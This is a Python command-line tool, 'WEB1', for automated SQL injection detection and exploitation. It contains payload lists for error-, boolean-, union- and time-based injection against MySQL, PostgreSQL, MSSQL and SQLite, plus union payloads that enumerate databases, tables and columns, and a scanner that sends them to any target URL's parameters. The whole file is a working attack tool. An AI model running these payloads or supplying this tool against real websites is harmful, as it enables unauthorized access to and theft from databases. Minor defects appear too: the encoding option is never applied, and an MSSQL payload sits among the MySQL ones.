#!/usr/bin/env python3
"""
WEB1 — SQL Injection Automation Tool
Automated SQLi detection and exploitation framework.
"""

import argparse
import sys
import time
import random
import string
import re
import json
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class InjectionType(Enum):
    ERROR_BASED = "error_based"
    BOOLEAN_BASED = "boolean_based"
    UNION_BASED = "union_based"
    TIME_BASED = "time_based"
    STACKED = "stacked"


class DBType(Enum):
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    SQLITE = "sqlite"
    ORACLE = "oracle"
    UNKNOWN = "unknown"


@dataclass
class ScanResult:
    url: str
    parameter: str
    injectable: bool
    injection_type: InjectionType
    db_type: DBType
    payload: str
    evidence: str = ""
    response_time: float = 0.0


@dataclass
class ScanConfig:
    url: str
    method: str = "GET"
    data: dict = field(default_factory=dict)
    cookies: dict = field(default_factory=dict)
    headers: dict = field(default_factory=dict)
    timeout: int = 10
    delay: float = 0.0
    level: int = 1
    risk: int = 1
    db_type: Optional[DBType] = None
    verbose: bool = False


SQLI_PAYLOADS = {
    DBType.MYSQL: {
        InjectionType.ERROR_BASED: [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
            "1' UNION SELECT NULL,EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
        ],
        InjectionType.BOOLEAN_BASED: [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            "1 AND 1=1",
            "1 AND 1=2",
            "' OR 1=1 LIMIT 1--",
            "1' AND SUBSTRING((SELECT version()),1,1)='5'--",
        ],
        InjectionType.UNION_BASED: [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
            "1 UNION SELECT NULL,NULL,NULL--",
        ],
        InjectionType.TIME_BASED: [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND BENCHMARK(10000000,SHA1('test'))--",
            "1 AND SLEEP(5)",
            "1' AND IF(1=1,SLEEP(5),0)--",
            "'; SELECT SLEEP(5);--",
        ],
    },
    DBType.POSTGRESQL: {
        InjectionType.ERROR_BASED: [
            "' AND 1=CAST((SELECT version()) AS int)--",
            "1 UNION SELECT CAST(version() AS int)--",
            "' AND 1=CAST((SELECT current_database()) AS int)--",
        ],
        InjectionType.BOOLEAN_BASED: [
            "' AND 1=1--",
            "' AND 1=2--",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(0) ELSE pg_sleep(0) END--",
        ],
        InjectionType.TIME_BASED: [
            "'; SELECT pg_sleep(5)--",
            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
            "1; SELECT pg_sleep(5)--",
        ],
    },
    DBType.MSSQL: {
        InjectionType.ERROR_BASED: [
            "' AND 1=CONVERT(int,@@version)--",
            "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        ],
        InjectionType.BOOLEAN_BASED: [
            "' AND 1=1--",
            "' AND 1=2--",
        ],
        InjectionType.TIME_BASED: [
            "'; WAITFOR DELAY '0:0:5'--",
            "1; WAITFOR DELAY '0:0:5'--",
            "' AND 1=1; WAITFOR DELAY '0:0:5'--",
        ],
    },
    DBType.SQLITE: {
        InjectionType.ERROR_BASED: [
            "' AND 1=CAST((SELECT sqlite_version()) AS int)--",
        ],
        InjectionType.BOOLEAN_BASED: [
            "' AND 1=1--",
            "' AND 1=2--",
        ],
    },
}

COMMON_PARAMS = [
    "id", "page", "cat", "item", "search", "q", "user", "name",
    "product", "category", "article", "post", "comment", "sort",
    "order", "type", "action", "file", "table", "column",
]

FINGERPRINT_QUERIES = {
    DBType.MYSQL: {
        "version": "SELECT version()",
        "user": "SELECT user()",
        "database": "SELECT database()",
        "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
    },
    DBType.POSTGRESQL: {
        "version": "SELECT version()",
        "user": "SELECT current_user",
        "database": "SELECT current_database()",
        "tables": "SELECT tablename FROM pg_tables WHERE schemaname='public'",
    },
    DBType.MSSQL: {
        "version": "SELECT @@version",
        "user": "SELECT SYSTEM_USER",
        "database": "SELECT DB_NAME()",
        "tables": "SELECT table_name FROM information_schema.tables",
    },
    DBType.SQLITE: {
        "version": "SELECT sqlite_version()",
        "database": "SELECT name FROM sqlite_master WHERE type='table'",
    },
}

ERROR_SIGNATURES = {
    DBType.MYSQL: [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
    ],
    DBType.POSTGRESQL: [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError",
        r"org\.postgresql\.util\.PSQLException",
    ],
    DBType.MSSQL: [
        r"Driver.*SQL[\-\_\ ]*Server",
        r"OLE DB.*SQL Server",
        r"\bSQL Server[^&lt;&quot;]+Driver",
        r"Warning.*mssql_",
        r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
        r"System\.Data\.SqlClient\.SqlException",
        r"Unclosed quotation mark after the character string",
    ],
    DBType.SQLITE: [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]",
    ],
    DBType.ORACLE: [
        r"\bORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"Warning.*ora_",
    ],
}

DATABASE_EXTRACTION_PAYLOADS = {
    "databases": {
        DBType.MYSQL: "' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--",
        DBType.POSTGRESQL: "' UNION SELECT NULL,database_name,NULL FROM pg_database--",
        DBType.MSSQL: "' UNION SELECT NULL,name,NULL FROM master..sysdatabases--",
    },
    "tables": {
        DBType.MYSQL: "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='{db}'--",
        DBType.POSTGRESQL: "' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='{db}'--",
        DBType.MSSQL: "' UNION SELECT NULL,name,NULL FROM {db}..sysobjects WHERE xtype='U'--",
    },
    "columns": {
        DBType.MYSQL: "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--",
        DBType.POSTGRESQL: "' UNION SELECT NULL,attname,NULL FROM pg_attribute WHERE attrelid='{table}'::regclass--",
        DBType.MSSQL: "' UNION SELECT NULL,name,NULL FROM {db}..syscolumns WHERE id=OBJECT_ID('{table}')--",
    },
}


def print_banner():
    banner = r"""
  ╔══════════════════════════════════════════╗
  ║    WEB1 — SQL Injection Automation Tool  ║
  ║        SQLi Detection & Exploit          ║
  ╚══════════════════════════════════════════╝
"""
    print(banner)


def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def encode_payload(payload: str, encoding: str = "none") -> str:
    if encoding == "url":
        return urllib.parse.quote(payload)
    elif encoding == "double_url":
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif encoding == "html":
        return ''.join(f"&#{ord(c)};" for c in payload)
    elif encoding == "unicode":
        return ''.join(f"\\u{ord(c):04x}" for c in payload)
    return payload


def detect_db_from_error(response_text: str) -> Optional[DBType]:
    for db_type, patterns in ERROR_SIGNATURES.items():
        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return db_type
    return None


class SQLiScanner:
    def __init__(self, config: ScanConfig):
        self.config = config
        self.session = requests.Session() if HAS_REQUESTS else None
        self.results: list[ScanResult] = []
        self.baseline_length = 0
        self.baseline_time = 0.0
        if self.session:
            self.session.headers.update(config.headers)
            self.session.cookies.update(config.cookies)

    def _request(self, url: str, method: str = "GET", data: dict = None) -> tuple[str, float]:
        start = time.time()
        try:
            if method.upper() == "POST":
                resp = self.session.post(url, data=data, timeout=self.config.timeout)
            else:
                resp = self.session.get(url, timeout=self.config.timeout)
            elapsed = time.time() - start
            return resp.text, elapsed
        except requests.exceptions.Timeout:
            return "", time.time() - start
        except Exception as e:
            if self.config.verbose:
                print(f"  [!] Request error: {e}")
            return "", time.time() - start

    def _build_url_with_param(self, base_url: str, param: str, value: str) -> str:
        parsed = urllib.parse.urlparse(base_url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _build_url_with_body_param(self, url: str, param: str, value: str) -> dict:
        data = dict(self.config.data)
        data[param] = value
        return data

    def establish_baseline(self):
        if self.config.verbose:
            print("[*] Establishing response baseline...")
        text, elapsed = self._request(self.config.url, self.config.method,
                                       self.config.data if self.config.method.upper() == "POST" else None)
        self.baseline_length = len(text)
        self.baseline_time = elapsed
        if self.config.verbose:
            print(f"    Baseline: {self.baseline_length} bytes, {self.baseline_time:.2f}s")

    def detect_error_based(self, url: str, param: str, method: str) -> Optional[ScanResult]:
        payloads = []
        db_types = [self.config.db_type] if self.config.db_type else list(DBType)
        for db in db_types:
            if db in SQLI_PAYLOADS and InjectionType.ERROR_BASED in SQLI_PAYLOADS[db]:
                payloads.extend((p, db) for p in SQLI_PAYLOADS[db][InjectionType.ERROR_BASED])

        for payload, db_type in payloads:
            if method.upper() == "POST":
                data = self._build_url_with_body_param(url, param, payload)
                response_text, elapsed = self._request(url, "POST", data)
            else:
                test_url = self._build_url_with_param(url, param, payload)
                response_text, elapsed = self._request(test_url)

            if response_text and detect_db_from_error(response_text):
                if self.config.verbose:
                    print(f"  [+] Error-based SQLi found: param={param}, db={db_type.value}")
                return ScanResult(
                    url=url, parameter=param, injectable=True,
                    injection_type=InjectionType.ERROR_BASED,
                    db_type=db_type, payload=payload,
                    evidence=response_text[:200], response_time=elapsed,
                )
        return None

    def detect_boolean_based(self, url: str, param: str, method: str) -> Optional[ScanResult]:
        db_types = [self.config.db_type] if self.config.db_type else list(DBType)
        for db in db_types:
            if db not in SQLI_PAYLOADS or InjectionType.BOOLEAN_BASED not in SQLI_PAYLOADS[db]:
                continue
            payload_pairs = SQLI_PAYLOADS[db][InjectionType.BOOLEAN_BASED]
            for i in range(0, len(payload_pairs) - 1, 2):
                true_payload = payload_pairs[i]
                false_payload = payload_pairs[i + 1]

                if method.upper() == "POST":
                    data_true = self._build_url_with_body_param(url, param, true_payload)
                    text_true, _ = self._request(url, "POST", data_true)
                    data_false = self._build_url_with_body_param(url, param, false_payload)
                    text_false, _ = self._request(url, "POST", data_false)
                else:
                    url_true = self._build_url_with_param(url, param, true_payload)
                    text_true, _ = self._request(url_true)
                    url_false = self._build_url_with_param(url, param, false_payload)
                    text_false, _ = self._request(url_false)

                len_diff = abs(len(text_true) - len(text_false))
                if len_diff > 50 and len(text_true) > 0:
                    if self.config.verbose:
                        print(f"  [+] Boolean-based SQLi found: param={param}, db={db.value}")
                    return ScanResult(
                        url=url, parameter=param, injectable=True,
                        injection_type=InjectionType.BOOLEAN_BASED,
                        db_type=db, payload=true_payload,
                        evidence=f"True: {len(text_true)} bytes, False: {len(text_false)} bytes",
                    )
        return None

    def detect_union_based(self, url: str, param: str, method: str) -> Optional[ScanResult]:
        db_types = [self.config.db_type] if self.config.db_type else list(DBType)
        for db in db_types:
            if db not in SQLI_PAYLOADS or InjectionType.UNION_BASED not in SQLI_PAYLOADS[db]:
                continue
            for payload in SQLI_PAYLOADS[db][InjectionType.UNION_BASED]:
                if method.upper() == "POST":
                    data = self._build_url_with_body_param(url, param, payload)
                    response_text, elapsed = self._request(url, "POST", data)
                else:
                    test_url = self._build_url_with_param(url, param, payload)
                    response_text, elapsed = self._request(test_url)

                if response_text and len(response_text) != self.baseline_length:
                    if self.config.verbose:
                        print(f"  [+] Union-based SQLi found: param={param}, db={db.value}")
                    return ScanResult(
                        url=url, parameter=param, injectable=True,
                        injection_type=InjectionType.UNION_BASED,
                        db_type=db, payload=payload,
                        evidence=f"Response size changed: {self.baseline_length} -> {len(response_text)}",
                        response_time=elapsed,
                    )
        return None

    def detect_time_based(self, url: str, param: str, method: str) -> Optional[ScanResult]:
        threshold = 4.0
        db_types = [self.config.db_type] if self.config.db_type else list(DBType)
        for db in db_types:
            if db not in SQLI_PAYLOADS or InjectionType.TIME_BASED not in SQLI_PAYLOADS[db]:
                continue
            for payload in SQLI_PAYLOADS[db][InjectionType.TIME_BASED]:
                if method.upper() == "POST":
                    data = self._build_url_with_body_param(url, param, payload)
                    _, elapsed = self._request(url, "POST", data)
                else:
                    test_url = self._build_url_with_param(url, param, payload)
                    _, elapsed = self._request(test_url)

                if elapsed >= threshold:
                    if self.config.verbose:
                        print(f"  [+] Time-based SQLi found: param={param}, db={db.value}, delay={elapsed:.1f}s")
                    return ScanResult(
                        url=url, parameter=param, injectable=True,
                        injection_type=InjectionType.TIME_BASED,
                        db_type=db, payload=payload,
                        evidence=f"Response delay: {elapsed:.1f}s",
                        response_time=elapsed,
                    )
        return None

    def detect_parameters(self) -> list[str]:
        detected = []
        parsed = urllib.parse.urlparse(self.config.url)
        params = urllib.parse.parse_qs(parsed.query)
        if params:
            detected.extend(params.keys())
        if self.config.data:
            detected.extend(self.config.data.keys())
        if not detected:
            detected.extend(COMMON_PARAMS[:5])
        return detected

    def detect_db_type(self, url: str, param: str, method: str) -> Optional[DBType]:
        error_payloads = [
            "'",
            "\"",
            "')",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
        ]
        for payload in error_payloads:
            if method.upper() == "POST":
                data = self._build_url_with_body_param(url, param, payload)
                response_text, _ = self._request(url, "POST", data)
            else:
                test_url = self._build_url_with_param(url, param, payload)
                response_text, _ = self._request(test_url)

            db = detect_db_from_error(response_text)
            if db:
                if self.config.verbose:
                    print(f"  [*] Database detected: {db.value}")
                return db
        return None

    def run_scan(self):
        if not HAS_REQUESTS:
            print("[!] Error: 'requests' library required. Install with: pip install requests")
            sys.exit(1)

        print(f"[*] Target: {self.config.url}")
        print(f"[*] Method: {self.config.method}")
        print(f"[*] Level: {self.config.level}, Risk: {self.config.risk}")
        print()

        self.establish_baseline()
        parameters = self.detect_parameters()
        print(f"[*] Parameters to test: {parameters}")
        print()

        for param in parameters:
            print(f"[*] Testing parameter: {param}")

            if not self.config.db_type:
                print(f"[*] Detecting database type...")
                db = self.detect_db_type(self.config.url, param, self.config.method)
                if db:
                    self.config.db_type = db

            print(f"[*] Testing error-based injection...")
            result = self.detect_error_based(self.config.url, param, self.config.method)
            if result:
                self.results.append(result)
                print(f"  [!] VULNERABLE: {param} (error-based, {result.db_type.value})")
                if self.config.level < 2:
                    continue

            print(f"[*] Testing boolean-based injection...")
            result = self.detect_boolean_based(self.config.url, param, self.config.method)
            if result:
                self.results.append(result)
                print(f"  [!] VULNERABLE: {param} (boolean-based, {result.db_type.value})")

            print(f"[*] Testing union-based injection...")
            result = self.detect_union_based(self.config.url, param, self.config.method)
            if result:
                self.results.append(result)
                print(f"  [!] VULNERABLE: {param} (union-based, {result.db_type.value})")

            if self.config.risk >= 2:
                print(f"[*] Testing time-based injection...")
                result = self.detect_time_based(self.config.url, param, self.config.method)
                if result:
                    self.results.append(result)
                    print(f"  [!] VULNERABLE: {param} (time-based, {result.db_type.value})")

            if self.config.delay > 0:
                time.sleep(self.config.delay)

    def print_results(self):
        print("\n" + "=" * 60)
        print("  SCAN RESULTS")
        print("=" * 60)

        if not self.results:
            print("\n  No SQL injection vulnerabilities found.\n")
            return

        for i, r in enumerate(self.results, 1):
            print(f"\n  [{i}] Parameter:   {r.parameter}")
            print(f"      Type:        {r.injection_type.value}")
            print(f"      Database:    {r.db_type.value}")
            print(f"      Payload:     {r.payload[:80]}")
            if r.evidence:
                print(f"      Evidence:    {r.evidence[:100]}")
            print(f"      URL:         {r.url[:100]}")

        print(f"\n  Total vulnerabilities: {len(self.results)}")
        print("=" * 60)

    def export_results(self, filename: str):
        data = []
        for r in self.results:
            data.append({
                "url": r.url,
                "parameter": r.parameter,
                "injectable": r.injectable,
                "injection_type": r.injection_type.value,
                "db_type": r.db_type.value,
                "payload": r.payload,
                "evidence": r.evidence,
                "response_time": r.response_time,
            })
        with open(filename, "w") as f:
            json.dump(data, f, indent=2)
        print(f"[*] Results exported to {filename}")


def main():
    parser = argparse.ArgumentParser(
        description="WEB1 — SQL Injection Automation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u "http://target.com/page?id=1"
  %(prog)s -u "http://target.com/login" -m POST -d "user=admin&pass=test"
  %(prog)s -u "http://target.com/page?id=1" --level 2 --risk 2
  %(prog)s -u "http://target.com/page?id=1" --db mysql
  %(prog)s -u "http://target.com/page?id=1" -o results.json
  %(prog)s -u "http://target.com/page?id=1" --encode url
        """,
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL with parameter")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP method")
    parser.add_argument("-d", "--data", default="", help="POST data (key=value&key2=value2)")
    parser.add_argument("-c", "--cookies", default="", help="Cookies (key=value;key2=value2)")
    parser.add_argument("--header", action="append", default=[], help="Custom header (can repeat)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between requests in seconds")
    parser.add_argument("--level", type=int, default=1, choices=[1, 2, 3], help="Scan level (1-3)")
    parser.add_argument("--risk", type=int, default=1, choices=[1, 2, 3], help="Risk level (1-3)")
    parser.add_argument("--db", choices=["mysql", "postgresql", "mssql", "sqlite", "oracle"], help="Force database type")
    parser.add_argument("--encode", choices=["none", "url", "double_url", "html", "unicode"], default="none", help="Payload encoding")
    parser.add_argument("-o", "--output", help="Export results to JSON file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    print_banner()

    db_type = None
    if args.db:
        db_type = DBType(args.db)

    data = {}
    if args.data:
        for pair in args.data.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                data[k] = v

    cookies = {}
    if args.cookies:
        for pair in args.cookies.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()

    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    config = ScanConfig(
        url=args.url,
        method=args.method,
        data=data,
        cookies=cookies,
        headers=headers,
        timeout=args.timeout,
        delay=args.delay,
        level=args.level,
        risk=args.risk,
        db_type=db_type,
        verbose=args.verbose,
    )

    scanner = SQLiScanner(config)
    scanner.run_scan()
    scanner.print_results()

    if args.output:
        scanner.export_results(args.output)


if __name__ == "__main__":
    main()
